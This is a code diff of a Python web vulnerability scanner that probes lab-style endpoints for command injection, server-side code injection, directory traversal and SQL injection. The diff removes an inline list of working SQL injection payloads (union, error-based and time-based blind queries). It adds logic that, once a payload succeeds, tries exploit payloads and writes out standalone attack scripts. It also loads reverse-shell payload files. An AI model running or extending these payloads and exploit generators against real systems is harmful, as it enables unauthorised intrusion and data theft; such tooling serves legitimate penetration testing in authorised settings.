@@ -35,36 +35,6 @@ SQLI_PROBES = [
 	" \" "
 ]
 
-SQLI_ATTACK = [
-
-	" union all select @@version -- +",
-	" union all select 1,@@version,1 -- +",
-	" union all select 1,1,@@version,1-- +",
-	" union all select 1,1,1,@@version,1-- +",
-	" union all select 1,1,1,1,@@version,1-- +",
-	" union all select 1,1,1,1,1,@@version,1-- +",
-	" union all select 1,1,1,1,1,1,@@version,1-- +",
-	"' union all select @@version -- +",
-	"' union all select 1,@@version,1 -- +",
-	"' union all select 1,1,@@version,1-- +",
-	"' union all select 1,1,1,@@version,1-- +",
-	"' union all select 1,1,,1,1,@@version,1-- +",
-	"' union all select 1,1,1,1,1,@@version,1-- +",
-	"' union all select 11,,1,1,1,1,@@version,1-- +",
-	"1' AND (select 1 from (select count(*),concat((select version()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -"
-	"1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b)-- +",
-	"\" AND (select 1 from (select count(*),concat((select version()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -"
-	"\" AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b)-- +",
-	"'' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"database1\" LIMIT 0,1)))--",
-	"' AND IF ((select ascii(substr(version(),1,1))) > 53,sleep(5),NULL)-- -",
-	"' AND IF ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='s',sleep(5),null) --+",
-	" union select 1, tbl_name FROM sqlite_master; -- -",
-	" union select 1, 2, tbl_name FROM sqlite_master; -- -",
-	" union select 1, 2, 3, tbl_name FROM sqlite_master; -- -",
-	" union select 1, 2, 3, 4, tbl_name FROM sqlite_master; -- -",
-	" union select 1, 2, 3, 4, 5, tbl_name FROM sqlite_master; -- -",
-	]
-
 DIR_TRAVERSAL_PROBES = [
 	"./" + "../" * 1 + "etc/passwd",
 	"./" + "../" * 2 + "etc/passwd",
@@ -87,21 +57,29 @@ DIR_TRAVERSAL_PROBES = [
 ]
 
 
-with open('commandInjPayloads.txt') as f:
+with open('vulnScanScripts/commandInjPayloads.txt') as f:
  commandExecList = list(f)
 
-with open('serverSidePayloads.txt') as f:
+with open('vulnScanScripts/serverSidePayloads.txt') as f:
  serverInjectList = list(f)
 
-with open('commandInjExploitPayloads.txt') as f:
+with open('vulnScanScripts/commandInjExploitPayloads.txt') as f:
  commandExecExploitList = list(f)
 
-with open('commandInjExploitRevShellPayloads.txt') as f:
+with open('vulnScanScripts/commandInjExploitRevShellPayloads.txt') as f:
  commandExecExploitRevShellList = list(f)
 
-with open('serverSideExploitPayloads.txt') as f:
+with open('vulnScanScripts/serverSideExploitPayloads.txt') as f:
  serverInjectExploitList = list(f)
 
+with open('vulnScanScripts/sqlExploitPayloads.txt') as f:
+ sqlExploitList = list(f)
+
+#Results file
+json_results = ""
+
+#Configure cookie header
+cookie_header = {'Cookie': 'testcookie'}
 
 session = Session()
 
@@ -115,18 +93,16 @@ def scan(url, params):
 	hostname = parts.scheme + "://" + parts.netloc
 	endpoint = parts.path
 
-	#Results file
-	json_results = ""
-
 
 	#Command Injection
 	initial_length = ""
-	exploitable = "no"
+	command_inj_exploitable = "no"
 	for method in params.keys():
 		method_params = params[method]
 
 	for key, value in method_params.items():
-		response = make_request(method, url, method_params)
+		#response = make_request(method, url, method_params)
+		response = make_auth_request(method, url, method_params, cookie_header)
 		initial_length = response.headers['content-length']
 		print "[*]Initial response content length: " + str(response.headers['content-length'])
 
@@ -136,7 +112,12 @@ def scan(url, params):
 		for key, value in method_params.items():
 			method_params[key] = x.replace("\n", "")
 
-			response = make_request(method, url, method_params)
+
+			#response = make_request(method, url, method_params)
+			response = make_auth_request(method, url, method_params, cookie_header)
+			#print response.request.headers
+			#print response.headers;
+
 			print "\n[*]Payload used: " + str(method_params)
 			print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
 			print "[*]Response content length: " + str(response.headers['content-length'])
@@ -147,7 +128,7 @@ def scan(url, params):
 			#Search for specific echo string 'gaw4f4sdaf12f', output of passwd or id command.
 			if response.content.find("gaw4f4sdaf12f") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1:
 				print "[*]Module is potentially vulnerable to command injection!"
-				exploitable = "yes"
+				command_inj_exploitable = "yes"
 				with open('results.txt', 'a') as result:
 					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')
 
@@ -162,12 +143,13 @@ def scan(url, params):
 			#Generate exploitation script for command injection
 			count = 0
 			exploited = "no"
-			if exploitable == "yes":
+			if command_inj_exploitable == "yes":
 				for y in commandExecExploitList:
 						for key, value in method_params.items():
 							if exploited == "no":
 								method_params[key] = y.replace("\n", "")
-								response = make_request(method, url, method_params)
+								#response = make_request(method, url, method_params)
+								response = make_auth_request(method, url, method_params, cookie_header)
 								print "\n[*]Searching for the correct exploit..."
 								print "[*]Payload used: " + str(method_params)
 								print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
@@ -175,9 +157,8 @@ def scan(url, params):
 								print "[*]Response content: \n" + response.content
 
 								count=+count+1
-								print exploited
 								if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
-									print "[*]Exploit found!"
+									print "[*]Exploit found! Generating standalone attack script..."
 
 									#Generate standalone exploit script to execute uname -a
 								 	with open('command_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
@@ -190,12 +171,8 @@ def scan(url, params):
 					 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
 					 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
 					 						exploitFile.write("print response.content")
-									#exploited = "yes"
-									#break
-
-
-
-
+									exploited = "yes"
+									break
 
 				'''
 				#Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
@@ -203,32 +180,30 @@ def scan(url, params):
 					for key, value in method_params.items():
 						method_params[key] = z.replace("\n", "")
 						count=+count+1
-
-						print method_params
-						#print str(method_params)
-					 	with open('command_injection_rev_shell'+str(count)+'.py', 'w') as exploitFile:
+						print "[*]Exploit found! Generating standalone attack script (Command injection reverse shell)..."
+					 	with open('command_injection_rev_shell'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
 		 					if method == "POST":
 		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
-		 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
+		 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params).replace("\\'","'")+')\n')
 		 						exploitFile.write("print response.content")
 
 		 					elif method == "GET":
 		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
 		 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
 		 						exploitFile.write("print response.content")
+								'''
 
-					 	exploitable = "no" # reset to orignal state
-						'''
 
 
 	#Server Side Injection
 	initial_length = ""
-	exploitable = "no"
+	server_side_exploitable = "no"
 	for method in params.keys():
 		method_params = params[method]
 
 	for key, value in method_params.items():
-		response = make_request(method, url, method_params)
+		#response = make_request(method, url, method_params)
+		response = make_auth_request(method, url, method_params, cookie_header)
 		initial_length = response.headers['content-length']
 		print "[*]Initial response content length: " + str(response.headers['content-length'])
 
@@ -237,7 +212,8 @@ def scan(url, params):
 		for key, value in method_params.items():
 			method_params[key] = x.replace("\n", "")
 
-		response = make_request(method, url, method_params)
+		#response = make_request(method, url, method_params)
+		response = make_auth_request(method, url, method_params, cookie_header)
 	 	print "\n[*]Payload used: " + str(method_params)
 	 	print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
 	 	print "[*]Response content length: " + str(response.headers['content-length'])
@@ -248,14 +224,14 @@ def scan(url, params):
 		#Searches for specific echo string, or output of passwd
 		if response.content.find("vq3rio13dj8x") != -1 or response.content.find("/bin") != -1:
 			print "[*]Module potentially vulnerable to sever side injection!"
-			exploitable = "yes"
+			server_side_exploitable = "yes"
 			with open('results.txt', 'a') as result:
 				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
 			#break
 
 		elif response.elapsed.total_seconds() > 12:
 			print "[*]Vulnerable to blind sever side injection"
-			exploitable = "yes"
+			server_side_exploitable = "yes"
 			with open('results.txt', 'a') as result:
 				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
 			#break
@@ -263,12 +239,13 @@ def scan(url, params):
 		#Generate exploitable script for server side injection
 		count = 0
 		exploited = "no"
-		if exploitable == "yes":
+		if server_side_exploitable == "yes":
 			for y in serverInjectExploitList:
 				for key, value in method_params.items():
 					if exploited == "no":
 						method_params[key] = y.replace("\n", "")
-						response = make_request(method, url, method_params)
+						#response = make_request(method, url, method_params)
+						response = make_auth_request(method, url, method_params, cookie_header)
 						print "\n[*]Searching for the correct exploit..."
 						print "[*]Payload used: " + str(method_params)
 						print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
@@ -279,7 +256,7 @@ def scan(url, params):
 						count=+count+1
 
 						if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
-							print "[*]Exploit found!"
+							print "[*]Exploit found! Generating standalone attack script..."
 							with open('server_side_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
 								if method == "POST":
 									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
@@ -291,9 +268,6 @@ def scan(url, params):
 									exploitFile.write("print response.content")
 							exploited = "yes"
 							break
-
-
-'''
 
 	# Check for open redirects
 	# ========================
@@ -349,6 +323,7 @@ def scan(url, params):
 						print("[!] Found directory traversal indication using parameter value (%s=%s)" % (param, probe))
 						break
 
+		sql_exploitable = "no"
 		print("[*] Trying SQLi probes")
 		for param in method_params.keys():
 			params_copy = copy.deepcopy(method_params)
@@ -360,13 +335,49 @@ def scan(url, params):
 				if "SLEEP" in probe or "sleep" in probe:
 					if response.elapsed.total_seconds() > CONFIG_SQLI_SLEEP_TIME:
 						print("[!] Highly possible SQLi, probe triggered server sleep using parameter value (%s=%s)" % (param, probe))
+						with open('results.txt', 'a') as result:
+							result.write(json.dumps({ "class":"SQL Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":params_copy, "method": method }] }}) + '\n')
+						sql_exploitable = "yes"
 						break
 				if delta_lines > 5:
 					print("[!] Possible SQLi, probe triggered large response delta using parameter value (%s=%s)" % (param, probe))
+					with open('results.txt', 'a') as result:
+						result.write(json.dumps({ "class":"SQL Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":params_copy, "method": method }] }}) + '\n')
+					sql_exploitable = "yes"
 					break
 
+			count = 0
+			exploited = "no"
+			if sql_exploitable == "yes":
+				for x in sqlExploitList:
+					for key, value in method_params.items():
+						if exploited == "no":
+							method_params[key] = x.replace("\n", "")
+							#response = make_request(method, url, method_params)
+							response = make_auth_request(method, url, method_params, cookie_header)
+							print "\n[*]Searching for the correct exploit..."
+							print "[*]Payload used: " + str(method_params)
+							print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
+							print "[*]Response content length: " + str(response.headers['content-length'])
+							print "[*]Response content: \n" + response.content
 
-'''
+							count=+count+1
+
+							if response.content.find("ubuntu") != -1: #Change detection logic of this when necessary
+								print "[*]Exploit found! Generating standalone attack script..."
+								with open('sql_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
+									if method == "POST":
+										exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
+										exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
+										exploitFile.write("print response.content")
+									elif method == "GET":
+										exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
+										exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
+										exploitFile.write("print response.content")
+								exploited = "yes"
+								break
+
+
 
 def make_request(method, url, params):
 	if method == 'POST':
@@ -377,9 +388,19 @@ def make_request(method, url, params):
 	else:
 		raise ValueError("Unknown method %s" % method)
 
+
+def make_auth_request(method, url, params, cookie):
+	if method == 'POST':
+		return session.post(url, data=params, headers=cookie)
+	elif method == 'GET':
+		return session.get(url, params=params, headers=cookie)
+	else:
+		raise ValueError("Unknown method %s" % method)
+
+
 if __name__ == '__main__':
 	#scan('http://target.com/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
-	#scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
+	scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
 	#scan('http://target.com/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})
-	scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8'}})
+	#scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8'}})
 	#scan('http://target.com/serverside/serverside.php', {'GET': {'language': 'apples'}})
